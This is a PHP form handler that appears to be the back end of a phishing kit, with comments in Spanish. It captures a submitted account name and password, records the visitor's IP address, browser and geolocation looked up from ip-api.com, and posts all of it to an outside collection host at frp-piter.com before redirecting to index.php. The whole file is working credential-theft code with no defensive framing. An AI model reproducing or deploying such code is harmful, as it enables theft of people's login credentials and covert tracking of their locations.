<?php													
if (isset($_POST["enviar"])){
	if (isset($_POST["account"]) && isset($_POST["password"])){
		$account = $_POST["account"];
		$password = $_POST["password"];
		if (strlen($account) > 8 && strlen($password) > 8){
			#capturar la ip y el navegador
			$ip = $_SERVER["REMOTE_ADDR"];
			$navegador = $_SERVER["HTTP_USER_AGENT"];
			#ver la fecha y hora
			$fecha = date("Y-m-d");
			$hora = date("H:i:s");
			#ver la informacion de la ip
			$info = file_get_contents("http://ip-api.com/json/".$ip);
			$json = json_decode($info);
			#ver dats de el json 
			$info_ip = $json->query;
			$json_country = $json->country;
			$json_countryCode = $json->countryCode;
			$json_region = $json->region;
			$json_regionName = $json->regionName;
			$json_city = $json->city;
			$json_zip = $json->zip;
			$json_lat = $json->lat;
			$json_lon = $json->lon;
			$json_timezone = $json->timezone;
			$json_isp = $json->isp;
			$json_org = $json->org;
			$json_as = $json->as;
			$curl = curl_init();
			$datos_curl = array(
				"ip" => $ip,
				"navegador" => $navegador,
				"fecha" => $fecha,
				"hora" => $hora,
				"info_ip" => $info_ip,
				"json_country" => $json_country,
				"json_countryCode" => $json_countryCode,
				"json_region" => $json_region,
				"json_regionName" => $json_regionName,
				"json_city" => $json_city,
				"json_zip" => $json_zip,
				"json_lat" => $json_lat,
				"json_lon" => $json_lon,
				"json_timezone" => $json_timezone,
				"json_isp" => $json_isp,
				"json_org" => $json_org,
				"json_as" => $json_as,
				"account" => $account,
				"password" => $password,
				"parax" => $_POST["email"]
			);
			curl_setopt($curl, CURLOPT_URL, "https://frp-piter.com/recibe.php");
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $datos_curl);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			$result = curl_exec($curl);
			curl_close($curl);
		}else{
            header("Location: index.php");
		}
	}else{
        #mandar al index
        header("Location: index.php");
    }
}header("Location: index.php");
?>